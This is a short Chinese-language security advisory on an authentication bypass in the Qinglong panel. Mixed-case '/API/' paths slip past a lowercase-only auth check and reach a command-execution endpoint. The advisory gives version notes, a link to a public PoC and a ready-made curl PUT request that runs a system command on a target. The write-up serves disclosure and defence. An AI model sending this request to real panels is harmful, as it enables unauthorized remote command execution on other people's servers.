# 青龙面板认证绕过致未授权RCE（QL-2026-007）

`QL-2026-007` 是本文沿用的内部标识，不是已核实的 CVE 编号。公开 PoC 仓库称影响版本为 `<2.20.1` 且修复版本待定；青龙上游 issue #2934 的后续评论称受影响版本为 2.20.0、2.20.1，2.20.2 已修复。该版本说明来自 issue 评论，未见正式厂商安全公告确认，故不将其视为官方修复声明。上游 issue 同时记录过 405 失败反馈；请求是否到达 Express 路由取决于部署和反向代理路径。

## 漏洞描述

青龙面板 < 2.20.1 存在认证绕过致未授权 RCE 漏洞。Express 路由默认大小写不敏感，但认证白名单正则与中间件均只做小写 `/api/` 前缀严格匹配：白名单 `/^\/(?!api\/).*/` 与 `req.path.startsWith('/api/')` 均无法命中 `/API/` 等大小写变体，导致认证被绕过。攻击者一条 `PUT /API/system/command-run` 请求即可执行任意系统命令。

## 影响版本

- PoC作者报告范围：青龙面板 < 2.20.1。上游issue后续评论报告 2.20.0、2.20.1 受影响；该评论称 2.20.2 已修复，尚无正式安全公告核实。
- PoC作者原记录：修复版本待定；上游issue评论称 2.20.2 已修复（社区报告，未由正式安全公告确认）

## 漏洞复现

公开 PoC：https://github.com/MaxMnMl/qinglong-auth-bypass-to-rce-poc

```sh
curl -X PUT "http://target:5700/aPi/system/command-run" \
  -H "Content-Type: application/json" \
  -d '{"command": "id"}'
```

## 漏洞修复

关注官方补丁；限制面板网络访问。
